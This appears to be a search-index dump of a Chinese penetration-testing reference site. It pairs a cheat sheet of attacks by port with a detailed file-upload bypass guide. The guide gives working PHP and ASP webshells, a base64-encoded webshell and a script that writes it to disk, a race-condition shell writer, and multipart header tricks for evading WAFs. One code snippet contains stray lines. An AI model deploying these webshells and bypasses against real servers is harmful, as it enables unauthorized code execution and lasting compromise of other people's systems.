SSH\uff1a\u8fdc\u7a0b\u8fde\u63a5 \u7528\u6237\u540d\u679a\u4e3e\u3001\u7206\u7834 23 Telnet\uff1a\u8fdc\u7a0b\u8fde\u63a5 \u7206\u7834\u3001\u5185\u7f51\u55c5\u63a2 25 SMTP\uff1a\u90ae\u4ef6\u670d\u52a1 \u90ae\u4ef6\u4f2a\u9020 53 DNS\uff1a\u57df\u540d\u7cfb\u7edf DNS\u57df\u4f20\u9001\\DNS\u7f13\u5b58\u6295\u6bd2\\DNS\u6b3a\u9a97\\\u5229\u7528DNS\u96a7\u9053\u6280\u672f\u523a\u900f\u9632\u706b\u5899 389 LDAP \u672a\u6388\u6743\u8bbf\u95ee\uff08\u901a\u8fc7LdapBrowser\u5de5\u5177\u76f4\u63a5\u8fde\u5165\uff09 443 https\u670d\u52a1 OpenSSL \u5fc3\u810f\u6ef4\u8840\uff08nmap -sV --script=ssl-heartbleed \u76ee\u6807\uff09 445 SMB\u670d\u52a1 ms17_010\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 873 rsync\u670d\u52a1 \u672a\u6388\u6743\u8bbf\u95ee 1090/1099 Java-rmi JAVA\u53cd\u5e8f\u5217\u5316\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e 1352 Lotus Domino\u90ae\u4ef6\u670d\u52a1 \u7206\u7834\uff1a\u5f31\u53e3\u4ee4\u3001\u4fe1\u606f\u6cc4\u6f0f\uff1a\u6e90\u4ee3\u7801 1433 MSSQL \u6ce8\u5165\u3001SA\u5f31\u53e3\u4ee4\u7206\u7834\u3001\u63d0\u6743 1521 Oracle \u6ce8\u5165\u3001TNS\u7206\u7834 2049 NFS \u914d\u7f6e\u4e0d\u5f53 2181 ZooKeeper\u670d\u52a1 \u672a\u6388\u6743\u8bbf\u95ee 3306 MySQL \u6ce8\u5165\u3001\u7206\u7834\u3001\u5199shell\u3001\u63d0\u6743 3389 RDP \u7206\u7834\u3001Shift\u540e\u95e8\u3001CVE-2019-0708\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 4848 GlassFish\u63a7\u5236\u53f0 \u7206\u7834\uff1a\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4\u3001\u8ba4\u8bc1\u7ed5\u8fc7 5000 Sybase/DB2\u6570\u636e\u5e93 \u7206\u7834\u3001\u6ce8\u5165 5432 PostgreSQL \u7206\u7834\u5f31\u53e3\u4ee4\u3001\u9ad8\u6743\u9650\u6267\u884c\u7cfb\u7edf\u547d\u4ee4 5632 PcAnywhere\u670d\u52a1 \u7206\u7834\u5f31\u53e3\u4ee4 5900 VNC \u7206\u7834\uff1a\u5f31\u53e3\u4ee4\u3001\u8ba4\u8bc1\u7ed5\u8fc7 6379 Redis \u672a\u6388\u6743\u8bbf\u95ee\u3001\u7206\u7834\u5f31\u53e3\u4ee4 7001 WebLogic\u4e2d\u95f4\u4ef6 \u53cd\u5e8f\u5217\u5316\u3001\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4+\u90e8\u7f72war\u5305\u3001SSRF 8000 jdwp JDWP \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08\u5de5\u5177\uff09 8080/8089 Tomcat/JBoss/Resin/Jetty/Jenkins \u53cd\u5e8f\u5217\u5316\u3001\u63a7\u5236\u53f0\u5f31\u53e3\u4ee4\u3001\u672a\u6388\u6743 8161 ActiveMQ admin/admin\u3001\u4efb\u610f\u6587\u4ef6\u5199\u5165\u3001\u53cd\u5e8f\u5217\u5316 8069 Zabbix \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c 9043 WebSphere\u63a7\u5236\u53f0 \u63a7\u5236\u53f0\u5f31\u53e3\u4ee4https://:9043/ibm/console/logon.jsp\u3001\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 9200/9300 Elasticsearch\u670d\u52a1 \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 11211 Memcache \u672a\u6388\u6743\u8bbf\u95ee\uff08nc -vv \u76ee\u6807 11211\uff09 27017 MongoDB \u672a\u6388\u6743\u8bbf\u95ee\u3001\u7206\u7834\u5f31\u53e3\u4ee4 50000 SAP \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c 50070 hadoop \u672a\u6388\u6743\u8bbf\u95ee"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/","title":"\u6587\u4ef6\u4e0a\u4f20\u7ed5\u8fc7\u901f\u67e5\u8868","text":"<p>\u6211\u8fd9\u91cc\u5c31\u5206\u4e3a\u4e24\u79cd\u5427\uff0c\u4e00\u79cd\u662f\u57fa\u4e8e\u4ee3\u7801\u9650\u5236\u7684\uff0c\u4e00\u79cd\u57fa\u4e8e\u9632\u706b\u5899\uff0c\u5176\u5b9e\u603b\u7684\u6765\u770b\u4e24\u8005\u5dee\u4e0d\u591a\uff0c\u90fd\u662f\u68c0\u6d4b\u6587\u4ef6\u5408\u6cd5\u6027\uff0c\u4f46\u662f\u4e24\u8005\u533a\u522b\u5f00\u6765\uff0c\u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u4fe1\u606f\u6536\u96c6\u4e4b\u540e\u5bf9\u4e8e\u4e00\u4e2a\u7f51\u7ad9\u7684\u9632\u62a4\u63aa\u65bd\u6709\u4e86\u4e86\u89e3\u540e\uff0c\u80fd\u591f\u66f4\u7cbe\u51c6\u7684\u9009\u62e9\u4e0a\u4f20\u7ed5\u8fc7\u65b9\u5f0f\u3002</p> <p>\uff08\u672c\u7bc7\u90fd\u4f7f\u7528php\u4e00\u53e5\u8bdd\u6728\u9a6c\u4f5c\u4e3a\u793a\u4f8b\uff09</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#js","title":"\u524d\u7aefJS\u9650\u5236\u6587\u4ef6\u540e\u7f00","text":"<p>\u9650\u5236\u53ea\u80fd\u4e0a\u4f20\u89c4\u5b9a\u540e\u7f00\u6587\u4ef6\uff0c\u7ed5\u8fc7\u65b9\u5f0f\uff1a</p> <p>1.\u7981\u7528\u68c0\u6d4b\u6587\u4ef6\u540e\u7f00\u7684JS\u4ee3\u7801</p> <p>2.\u4e0a\u4f20\u6b63\u5e38\u683c\u5f0f\u6587\u4ef6\uff0c\u6293\u5305\u4fee\u6539\u6587\u4ef6\u7684filename\u4e3a\u811a\u672c\u683c\u5f0f</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#content-type","title":"Content-type\u9650\u5236","text":"<p>\u540e\u53f0\u6821\u9a8c\u4e0a\u4f20\u6587\u4ef6\u7684Content-type\u662f\u5426\u4e3a\u6307\u5b9a\u503c\uff0c\u7ed5\u8fc7\u65b9\u5f0f\uff1a</p> <p>1.\u4e0a\u4f20\u65f6\u6293\u5305\u4fee\u6539Content-type</p> <p>2.\u4e0a\u4f20\u6b63\u5e38\u683c\u5f0f\u6587\u4ef6\uff0c\u6293\u5305\u4fee\u6539\u6587\u4ef6\u7684filename\u4e3a\u811a\u672c\u683c\u5f0f</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_2","title":"\u6587\u4ef6\u540e\u7f00\u9ed1\u540d\u5355\u68c0\u6d4b\u9650\u5236","text":"<p>1.\u5927\u5c0f\u5199\u7ed5\u8fc7\uff0c\u4f8b\u5982\u9ed1\u540d\u5355\u4e2d\u4e3a.php\uff0c\u90a3\u4e48\u53ef\u4ee5\u4e0a\u4f20.PHP\u6216\u8005.Php\u6765\u7ed5\u8fc7\u9ed1\u540d\u5355</p> <p>2.\u201c. \u201d\u201c_\u201d\u53f7\u548c\u7a7a\u683c\u7ed5\u8fc7\uff0c\uff08\u53ea\u9002\u7528\u4e8eWindows\u7cfb\u7edf\uff09Windows\u7cfb\u7edf\u4e0b\uff0c\u6587\u4ef6\u540d\u540e\u7f00\u6700\u540e\u4e00\u4e2a\u201c.\u201d\u201c_\u201d\u548c\u7a7a\u683c\u4f1a\u88ab\u81ea\u52a8\u53bb\u9664\uff0c\u4f8b\u5982\u9ed1\u540d\u5355\u4e3a.php\uff0c\u90a3\u4e48\u53ef\u4ee5\u4e0a\u4f20.php.\uff0c.php_\u6216\u8005.php \u6765\u7ed5\u8fc7\u9ed1\u540d\u5355\uff0cWindows\u5728\u89e3\u6790\u65f6\u4f1a\u5220\u9664\u6700\u540e\u4e00\u4e2a.\u548c_\u8fd8\u6709\u7a7a\u683c</p> <p>3.::\\(DATA\u7ed5\u8fc7\uff0c\uff08\u53ea\u9002\u7528\u4e8eWindows\u7cfb\u7edf\uff09\u5728Windows\u7684\u65f6\u5019\u5982\u679c\u6587\u4ef6\u540d+\"::\\)DATA\"\u4f1a\u628a::\\(DATA\u4e4b\u540e\u7684\u6570\u636e\u5f53\u6210\u6587\u4ef6\u6d41\u5904\u7406,\u4e0d\u4f1a\u68c0\u6d4b\u540e\u7f00\u540d\uff0c\u4e14\u4fdd\u6301::\\)DATA\u4e4b\u524d\u7684\u6587\u4ef6\u540d</p> <p>4.\u53cc\u5199\u7ed5\u8fc7\uff0c\u6709\u4e9b\u51fd\u6570\u4f1a\u66ff\u6362\u654f\u611f\u6587\u4ef6\u540d\uff0c\u4f46\u4e0d\u9012\u5f52\u5220\u9664\u7684\u8bdd\u5c31\u53ef\u4ee5\u53cc\u5199\u7ed5\u8fc7\uff0c\u4f8b\u5982a.phphpp\uff0cphp\u88ab\u66ff\u6362\u4e3a\u7a7a\u540e\u5c31\u6210\u4e86a.php</p> <p>5.00\u622a\u65ad\u7ed5\u8fc7\uff0c\u4e0a\u4f20\u65f6\u4e0a\u4f20a.php.jpg\uff0c\u6293\u5305\u5728php\u540e\u6dfb\u52a0\u4e00\u4e2a\u5b57\u7b26\u4fee\u6539\u5176HEX\u503c\u4e3a00\uff0c\u8fd9\u6837\u89e3\u6790\u4e4b\u540e\u5c31\u662fa.php\u4e86\uff0c\u4e5f\u7ed5\u8fc7\u4e86\u9ed1\u540d\u5355\uff1b \u5e38\u89c1\u4e8eASP\u7a0b\u5e8f\uff0cJSP\u4e5f\u4f1a\u51fa\u73b0 PHP\u9650\u5236\u6761\u4ef6\uff1a php&lt;5.3.4 php.ini\u4e2d\u7684magic_quotes_gpc\u8bbe\u7f6e\u4e3aOFF</p> <p>6.\u4e0a\u4f20\u53ef\u89e3\u6790\u7684\u6269\u5c55\u6587\u4ef6\u540d\uff0c\u4f8b\u5982\uff1a</p> <p>asp/aspx: asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr</p> <p>php : php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml</p> <p>jsp : jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml</p> <p>\u53ef\u5229\u7528burp fuzz\u6d4b\u8bd5</p> <p>7..htaccess\u548c.user.ini\u7ed5\u8fc7\u9ed1\u540d\u5355</p> <p>.htaccess\u4f7f\u7528\u6761\u4ef6\uff1a</p> <p>.htaccess\u53ea\u9002\u7528apache \u2460\u3001Allow Override All \u2461\u3001LoadModule rewrite_module modules/mod_rewrite.so #rewrite\u6a21\u5757\u4e3a\u5f00\u542f\u72b6\u6001</p> <p>.htaccess\u5185\u5bb9\uff1a</p> <pre><code>AddType application/x-httpd-php .jpg\n\u5c06\u6240\u6709\u540e\u7f00\u4e3a.jpg\u7684\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u89e3\u6790\n</code></pre> <pre><code>&lt;FilesMatch \"BaiZe\"&gt;\nsetHandler application/x-httpd-phpBZ\n&lt;/FilesMatch&gt;  \n\u5c06\u6240\u6709\u6587\u4ef6\u540d\u5305\u542bBaiZe\u7684\u6587\u4ef6\u4f5c\u4e3aphp\u6587\u4ef6\u89e3\u6790\n</code></pre> <p>\u200b           </p> <p>.user.ini\u4f7f\u7528\u6761\u4ef6\uff1a</p> <p>\u2460.user.ini\u9002\u7528\u4e8e\u670d\u52a1\u5668\u4f7f\u7528CGI\uff0fFastCGI\u6a21\u5f0f\u4e14\u76ee\u5f55\u4e0b\u8981\u6709\u53ef\u6267\u884c\u7684php\u6587\u4ef6</p> <p>.user.ini\u5185\u5bb9\uff1a</p> <pre><code>auto_prepend_file=a.jpg\na.jpg\u4e2d\u7b26\u5408php\u8bed\u8a00\u7684\u4ee3\u7801\u4f1a\u88ab\u6267\u884c\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_3","title":"\u6587\u4ef6\u5934\u9650\u5236","text":"<p>\u6587\u4ef6\u5934\u68c0\u6d4b\uff0c\u4e0a\u4f20\u56fe\u7247\u9a6c\uff0c\u5728\u4fee\u6539\u540e\u7f00\u4e3a\u53ef\u89e3\u6790\u811a\u672c\u8bed\u8a00\uff1b\u6216\u8005\u4e0a\u4f20\u4e00\u53e5\u8bdd\u6728\u9a6c\u5728\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6b63\u5e38\u683c\u5f0f\u6587\u4ef6\u5934\u4f8b\u5982\uff1aGIF89a</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_4","title":"\u5371\u9669\u51fd\u6570\u68c0\u6d4b","text":"<p>\u4e00\u822c\u4e3awaf\u5bf9\u4e0a\u4f20\u6587\u4ef6\u7684\u5185\u5bb9\u8fdb\u884c\u68c0\u6d4b</p> <p>1.\u4f7f\u7528\u52a8\u6001\u8c03\u7528\u7ed5\u8fc7\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;?php $_GET['0']($_GET['1']);?&gt;\n\u6b64\u65b9\u6cd5\u4e0d\u80fd\u7ed5\u8fc7disable_function\n</code></pre> <p>2.\u4e0a\u4f20\u7f16\u7801\u540e\u7684webshell\u914d\u5408.htaccess\u6765\u89e3\u6790</p> <p>3.\u4e0a\u4f20\u7f16\u7801\u540e\u7684webshell\uff0c\u518d\u53e6\u5916\u4e0a\u4f20\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\u89e3\u7801webshell\u5e76\u5199\u5165\u65b0\u6587\u4ef6\uff0c\u4f8b\u5982\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u4e3a1.php</p> <pre><code>PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=\n</code></pre> <p>\u4e0a\u4f20\u540e\u518d\u4e0a\u4f20\u4e0b\u9762\u4e3a2.php</p> <pre><code>&lt;?php \n\n$path =\"/xx/xxx/xx/1.php\";\n\n$str= file_get_contents($path);\n\n$strs = base64_decode($str);\n\n$test = fopen(\"./test.php\",\"w\");test\ntest\nfwrite($test,$strs);\nfclose($test);\n?&gt;\n</code></pre> <p>\u7136\u540e\u8bbf\u95ee\u540e\u518d\u8bbf\u95eetest.php\u5373\u53efgetshell</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#waf","title":"WAF\u62e6\u622a\u7ed5\u8fc7","text":"<p>\u5e38\u7528\u7684\u9ed1\u540d\u5355\u7ed5\u8fc7\u65b9\u6cd5\u4e5f\u9002\u7528\u4e8e\u90e8\u5206waf\uff0c\u66f4\u591a\u7684\u662f\u9700\u8981\u914d\u5408\u4f7f\u7528\u624d\u80fd\u6210\u529f\u4e0a\u4f20\uff0c\u4e3b\u8981\u601d\u8def\u4e3a\u63a5\u6536\u6587\u4ef6\u540d\u548cwaf\u7684\u68c0\u6d4b\u6709\u6240\u5dee\u5f02\uff0c\u53ea\u8981\u662f\u670d\u52a1\u5668\u80fd\u63a5\u6536\u5e76\u89e3\u6790\uff0c\u600e\u6837\u80fd\u7ed5\u8fc7waf\u7684\u68c0\u6d4b\u90fd\u53ef\u4ee5\u3002</p> <p>\u4f8b\u598200\u622a\u65ad\uff0c\u6587\u4ef6\u540d+;\u53f7\uff0c\u6587\u4ef6\u540d+'\u53f7\uff0c\u4e0a\u4f20hatccess\u548cuser.ini\uff0c\u4e0a\u9762\u6982\u8ff0\u8fc7\u7684\u8fd9\u91cc\u4e0d\u518d\u91cd\u590d\uff0c\u4f7f\u7528\u65f6\u5e94\u914d\u5408\u4f7f\u7528</p> <p>1.\u6362\u884c\u7ed5\u8fc7\u68c0\u6d4b\uff0c\u4f8b\u5982</p> <pre><code>Content-Disposition: form-data; name=\"file\"; filename=\"1.p\nhp\"\nContent-Disposition: form-data; name=\"file\"; file\nname=\"1.php\"\nContent-Disposition: form-data; name=\"file\"; filename=\n\"1.php\"\n\u4e09\u79cd\u5747\u53ef\n</code></pre> <p>2.\u591a\u4e2a\u7b49\u53f7\u7ed5\u8fc7\u68c0\u6d4b\uff0c\u4f8b\u5982</p> <pre><code>Content-Disposition: form-data; name=\"file\"; filename===\"a.php\"\n</code></pre> <p>3.\u589e\u5927\u6587\u4ef6\u5927\u5c0f\uff0c\u7c7b\u4f3c\u4e8esql\u6ce8\u5165\u7684\u5783\u573e\u5b57\u7b26\u7ed5waf\uff0c\u4f8b\u5982</p> <pre><code>Content-Disposition: form-data; aaaaaaaaaaaaaaaaaaaaa......aaaaaaaaaaaaaaaaaaaaa;name=\"file\"; filename=\"a.php\"\n</code></pre> <p>4.\u53bb\u6389\u6216\u66ff\u6362\u5f15\u53f7\u7ed5\u8fc7waf</p> <pre><code>Content-Disposition: form-data; name=file1; filename=a.php\nContent-Disposition: form-data; name='file1'; filename=\"a.php\"\n</code></pre> <p>4.\u589e\u52a0filename\u5e72\u6270\u62e6\u622a\uff0c\u4f8b\u5982</p> <pre><code>Content-Disposition: form-data; name=\"file\"; filename= ;  filename=\"a.php\"\n</code></pre> <p>5.\u6df7\u6dc6waf\u5339\u914d\u5b57\u6bb5\uff0c\u4f8b\u5982</p> <p>\u6df7\u6dc6form-data</p> <pre><code>Content-Disposition: name=\"file\"; filename=\"a.php\"\n\u53bb\u9664form-data\n</code></pre> <pre><code>Content-Disposition: AAAAAAAA=\"BBBBBBBB\"; name=\"file\";  filename=\"a.php\"\n\u66ff\u6362form-data\u4e3a\u5783\u573e\u503c\n</code></pre> <pre><code>Content-Disposition: form-data   ; name=\"file\"; filename=\"a.php\"\nform-data\u540e\u52a0\u7a7a\u683c\n</code></pre> <pre><code>Content-Disposition: for+m-data; name=\"file\"; filename=\"a.php\"\nform-data\u4e2d\u52a0+\n</code></pre> <p>\u6df7\u6dc6ConTent-Disposition</p> <pre><code>COntEnT-DIsposiTiOn: form-data; name=\"file\"; filename=\"a.php\"\n\u5927\u5c0f\u5199\u6df7\u6dc6\n</code></pre> <pre><code>Content-Type: image/gif\nContent-Disposition: form-data; name=\"file\";  filename=\"a.php\"\n\u8c03\u6362Content-Type\u548cConTent-Disposition\u7684\u987a\u5e8f\n</code></pre> <pre><code>Content-Type: image/gif\nContent-Disposition: form-data; name=\"file\";  filename=\"a.php\"\nContent-Type: image/gif\n\u589e\u52a0\u989d\u5916\u7684\u5934\n</code></pre> <pre><code>AAAAAAAA:filename=\"aaa.jpg\";\nContent-Disposition: form-data; name=\"file\";  filename=\"a.php\"\nContent-Type: image/gif\n\u589e\u52a0\u989d\u5916\u7684\u5934\n</code></pre> <pre><code>Content-Length: 666\nContent-Disposition: form-data; name=\"file\";  filename=\"a.php\"\nContent-Type: image/gif\n\u589e\u52a0\u989d\u5916\u7684\u5934\n</code></pre> <p>6.\u53cc\u6587\u4ef6\u7ed5\u8fc7\uff0c\u4f8b\u5982\u5b89\u5168\u72d7\u603b\u4ee5\u6700\u540e\u4e00\u4e2aContent-Disposition\u4e2d\u7684\u503c\u505a\u4e3a\u63a5\u6536\u53c2\u6570\u8fdb\u884c\u68c0\u6d4b\uff0c\u4e00\u4e9b\u4e2d\u95f4\u4ef6\u4f8b\u5982IIS6.0\u603b\u662f\u4ee5\u7b2c\u4e00\u4e2aContent-Disposition\u4e2d\u7684\u503c\u505a\u4e3a\u63a5\u6536\u53c2\u6570\u3002</p> <p>7.\u5bb9\u5668\u4e0eWAF\u5bf9Boundary\u8981\u6c42\u89c4\u5219\u4e0d\u4e00\u81f4</p> <pre><code>Content-Type: multipart/form-data; boundary=---------------------------471****1141173****525****99\nContent-Length: 253\n-----------------------------471****1141173****525****99\nContent-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\"\nContent-Type: application/octet-stream\n&lt;%eval request(\"a\")%&gt;\n-----------------------------471****1141173****525****99--\n</code></pre> <p>\u4e00\u4e9bWAF\u4f1a\u8ba4\u4e3a\u4e24\u6bb5Boundary\u4e0d\u4e00\u81f4\u7684\u6570\u636e\u662f\u65e0\u610f\u4e49\u7684\uff0c\u4e0d\u8fdb\u884c\u68c0\u6d4b\uff0c\u800c\u5bb9\u5668\u5e76\u6ca1\u6709\u4e25\u683c\u8981\u6c42\uff0c\u6b63\u5e38\u63a5\u6536\u6570\u636e\u3002</p> <p>8.\u6761\u4ef6\u7ade\u4e89\uff0c\u4e00\u4e9b\u60c5\u51b5\u4e0b\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u5148\u4e0a\u4f20\u5230\u4e34\u65f6\u76ee\u5f55\uff0c\u7136\u540e\u518d\u68c0\u6d4b\uff0c\u68c0\u6d4b\u5230\u518d\u5220\u9664\uff0c\u4f8b\u5982\uff1a\u53ef\u4ee5\u4e0a\u4f20\u751f\u6210\u4e00\u53e5\u8bdd\u6728\u9a6c\u7684\u6587\u4ef6</p> <pre><code>fputs(fopen('shell6666.php','w'),'&lt;?php @eval($_POST[1])?&gt;');\n</code></pre> <p>\u4e0a\u4f20\u540c\u65f6\u75af\u72c2\u91cd\u590d\u53d1\u5305\u8bbf\u95ee\u6b64\u6587\u4ef6\uff0c\u5c31\u6709\u53ef\u80fd\u4f1a\u5728\u6587\u4ef6\u88ab\u5220\u9664\u4e4b\u524d\u751f\u6210webshell\u6587\u4ef6a.php</p>"},{"location":"%E9%9D%B6%E5%9C%BAWriteup/%E9%9D%B6%E5%9C%BAWriteup/","title":"\u5b89\u5168\u9776\u573a","text":"Vulapps <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 Vulnhub <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 VulWeb <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 Pentester <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 xss challenges <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 BUUCTF <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 hackinglab <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8 owaspbwa <p>\u8fd9\u662f\u4e00\u4e2a\u76d2\u5b50\u6a21\u5757\u5316\u7684\u5185\u5bb9\u90e8\u5206\u3002</p> \u4f20\u9001\u95e8"}]}